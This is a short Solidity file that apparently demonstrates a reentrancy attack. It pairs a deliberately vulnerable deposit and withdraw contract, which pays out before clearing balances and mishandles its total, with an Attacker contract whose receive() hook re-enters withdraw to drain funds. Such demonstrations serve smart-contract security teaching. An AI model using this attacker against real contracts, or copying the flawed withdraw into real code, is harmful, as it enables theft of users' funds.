// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface  IVulnContract {
    function deposit() external payable;
    function withdraw() external;
    function totalBalance() external returns(uint);
    function getUserBalance(address user) external view returns(uint);
}

contract ReentrantVulnerable is IVulnContract {
    uint public totalBalance = 0;
    mapping (address => uint)  balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalBalance += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "user has no balance");
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success);
        balances[msg.sender] = 0;
        totalBalance -= balances[msg.sender];
    }

    function getUserBalance(address user) public view returns(uint) {
        return balances[user];
    }
}



contract Attacker {
    IVulnContract public immutable contratoVulnerable ;

    constructor(
        IVulnContract vulnContract
    ) {
        contratoVulnerable = vulnContract;
    }

    function prepararAtaque() public payable {
       contratoVulnerable.deposit{value: msg.value}();
    }

    function ejecutarAtaque() public {
        contratoVulnerable.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if(address(contratoVulnerable).balance < contratoVulnerable.getUserBalance(address(this))) {
            return;
        }
        contratoVulnerable.withdraw();
    }
}